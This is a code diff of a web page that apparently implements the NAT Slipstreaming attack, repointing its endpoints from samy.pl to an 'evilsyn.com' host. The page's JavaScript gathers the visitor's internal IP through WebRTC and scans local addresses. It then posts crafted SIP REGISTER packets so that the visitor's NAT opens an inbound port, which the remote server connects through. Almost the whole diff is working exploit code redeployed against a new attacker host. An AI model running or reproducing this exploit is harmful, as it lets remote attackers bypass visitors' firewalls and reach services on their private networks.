@@ -21,7 +21,7 @@
 
 <p>
 please run:<br>
-<?php 
+<?php
 $port = @$_GET['port'] ? $_GET['port'] : 3306;
 $port = preg_replace("/[^0-9]/", "", $port); // to fix the xss issue
 ?>
@@ -42,7 +42,7 @@ then hit the button below<br>
 function q2d($ip)
 {
 	$ips = explode (".", $ip);
-	return ($ips[3] + $ips[2] * 256 + $ips[1] * 256 * 256 + $ips[0] * 256 * 256 * 256); 
+	return ($ips[3] + $ips[2] * 256 + $ips[1] * 256 * 256 + $ips[0] * 256 * 256 * 256);
 }
 $ip = q2d(getenv('REMOTE_ADDR'));
 ?>
@@ -343,20 +343,22 @@ function maxpktsize()
 		pkt += PAD
 	pkt += 'END_SAMY_MAXPKTSIZE'
 
-	getSize()
 
 	// note 'packet_size' length is critical, must be same as other post
 	log('responding to SYN with maximum segment size TCP option to control data size')
-	post("http://samy.pl:5060/samy_pktsiz", pkt, 1)
+	post("http://evilsyn.com:5061/samy_pktsiz", pkt, 1)
 	log('sending TCP beacon to detect maximum packet size and MTU')
+
+	getSize()
 }
 
 function getSize()
 {
 	var scr = document.createElement('script')
 	scr.type = 'text/javascript'
-	scr.src = '//samy.pl/natpin/get_size?id=' + rand + '&rand=' + rnd()
+	scr.src = 'http://evilsyn.com/slipstream/get_size.php?id=' + rand + '&rand=' + rnd()
 	log('requesting sniffed packet sizes from server')
+	log(scr.src)
 	document.head.appendChild(scr)
 }
 
@@ -374,6 +376,7 @@ function addScript(url)
 	var scr = document.createElement('script')
 	scr.type = 'text/javascript'
 	scr.src = url
+	log(scr.src)
 	document.head.appendChild(scr)
 }
 
@@ -443,7 +446,7 @@ function offset(off, data, origoff)
 				lastOff = off
 
 			log("packet size changed on us, reattempt SIP REGISTER")
-			addScript('//samy.pl/natpin/monitor?id=' + rand + '&port=' + port + '&rnd=' + rnd())
+			addScript('http://evilsyn.com/slipstream/monitor.php?id=' + rand + '&port=' + port + '&rnd=' + rnd())
 			attemptPin(fullpkt)
 		}
 	}
@@ -468,7 +471,7 @@ function offset(off, data, origoff)
 			else
 				log("<br><b>status:</b> ip in returned SIP packet is <b>" + ip + "</b> is no different than what we sent, NAT likely does not have ALG enabled for TCP SIP<br>")
 		}
-		
+
 		if (ip != internal || !scanForLocalip)
 			tryConnect()
 		else
@@ -480,7 +483,7 @@ function tryConnect()
 {
 	log('running: nc -v <?php echo getenv('REMOTE_ADDR') ?> ' + port)
 	log('\n<b>attempting to bypass your NAT/firewall</b>')
-	addScript('//samy.pl/natpin/connect?id=' + rand + '&port=' + port)
+	addScript('//evilsyn.com/slipstream/connect.php?id=' + rand + '&port=' + port)
 }
 
 // called from /connect (along with some log()s)
@@ -540,7 +543,7 @@ function runpin()
 			tryConnect()
 			return
 		}
-		internal = possibleIps.shift()	
+		internal = possibleIps.shift()
 		log('trying potential internal ip <b>' + internal + '</b>')
 	}
 	port = document.getElementById('port').value
@@ -549,7 +552,7 @@ function runpin()
 	ip = <?php echo $ip ?>;
 	var cid = rand.padStart(30, 'a') + 'b'
 
-	var reg = 'REGISTER sip:samy.pl;transport=TCP SIP/2.0\r\nVia: SIP/2.0/TCP {INTIP}:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP\r\nMax-Forwards: 70\r\nContact: <sip:samy@{INTIP}:' + port + ';rinstance=v40f3f83b335139c;transport=TCP>\r\nTo: <sip:samy@samy.pl;transport=TCP>\r\nFrom: <sip:samy@samy.pl;transport=TCP>;tag=U7c3d519\r\nCall-ID: ' + cid + 'bbbbbZjQ4M2M.\r\nCSeq: 1 REGISTER\r\nExpires: 70\r\nAllow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE\r\nSupported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri\r\nUser-Agent: samy natpinning v2\r\nAllow-Events: presence, kpml\r\nContent-Length: 0\r\n\r\n'
+	var reg = 'REGISTER sip:evilsyn.com;transport=TCP SIP/2.0\r\nVia: SIP/2.0/TCP {INTIP}:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP\r\nMax-Forwards: 70\r\nContact: <sip:samy@{INTIP}:' + port + ';rinstance=v40f3f83b335139c;transport=TCP>\r\nTo: <sip:samy@evilsyn.com;transport=TCP>\r\nFrom: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519\r\nCall-ID: ' + cid + 'bbbbbZjQ4M2M.\r\nCSeq: 1 REGISTER\r\nExpires: 70\r\nAllow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE\r\nSupported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri\r\nUser-Agent: samy natpinning v2\r\nAllow-Events: presence, kpml\r\nContent-Length: 0\r\n\r\n'
 	//reg += 'v=0\r\no=151 9655 9655 IN IP4 {INTIP}\r\ns=-\r\nc=IN IP4 {INTIP}\r\nt=0 0\r\nm=audio '+port+' RTP/AVP 8 0 2 18\r\na=rtpmap:8 PCMA/8000\r\na=rtpmap:0 PCMU/8000\r\na=rtpmap:2 G726-32/8000/1\r\na=rtpmap:18 G729/8000\r\na=ptime:20\r\na=maxptime:80\r\na=sendrecv\r\na=rtcp:50025\r\n\r\n'
 
 	// create the padding to force our packet to fall onto next packet boundary
@@ -573,7 +576,7 @@ function runpin()
 	fullpkt = s
 
 	// get our sip request from the server, calls offset() if good, otherwise noRespTimer will likely hit
-	addScript('//samy.pl/natpin/monitor?id=' + rand + '&port=' + port + '&rnd=' + rnd())
+	addScript('http://evilsyn.com/slipstream/monitor.php?id=' + rand + '&port=' + port + '&rnd=' + rnd())
 
 	// if we don't get request in a few seconds, something wrong...maybe wrong internal ip if safari
 	noRespTimer = setTimeout(noResponse, 5000)
@@ -591,7 +594,7 @@ function attemptPin(pkt)
 	// keep changing url to evade browser caching attempts
 	// THE LENGTH OF THE URL MUST BE 12 bytes total, eg /samy_n?0012
 	// to match the same size we got when testing /samy_pktsiz
-	post("http://samy.pl:5060/samy_n?"+incr, pkt, 1)
+	post("http://evilsyn.com:5060/samy_n?"+incr, pkt, 1)
 }
 
 function post(url, str, reuse)
@@ -678,7 +681,7 @@ function startStun()
 	{
     if (window.location.protocol === 'https:')
       setTimeout(function() { gohttp() }, 1000)
-		if (internal) // odd, this should have been cleared by candidate	
+		if (internal) // odd, this should have been cleared by candidate
 		{
 			log("weird, somehow got internal ip " + internal + ", continuing")
 			checkButton()
@@ -720,7 +723,7 @@ function go(type)
 
 function nlog(str)
 {
-	post('//samy.pl/natpin/nlog', str)
+	post('http://evilsyn.com/slipsream/nlog.php', str)
 }
 function gather(sc)
 {
@@ -780,7 +783,7 @@ function handleCandidate(candidate)
 	}
 	var ip = ips[1]
 	console.log('can', candidate, JSON.stringify(candidate))
-	
+
 	// remove duplicates
 	if (ip_dups[ip] === undefined)
 	{
@@ -869,7 +872,7 @@ function scanForIP(forced)
 	setTimeout(function() {
 		setInterval(scanClass, scanBlocksMs)
 	}, delayScan)
-	
+
 	setTimeout(checkButton, delayScan + scanBlocksMs * (256 / scanInBlocks))
 	//internal = prompt("Sorry, this won't work in Safari without knowing your *internal* ip - please enter it here")
 	//internal = internal.replace(' ', '')
@@ -1032,3 +1035,4 @@ start()
 </script>
 </body>
 </html>
+
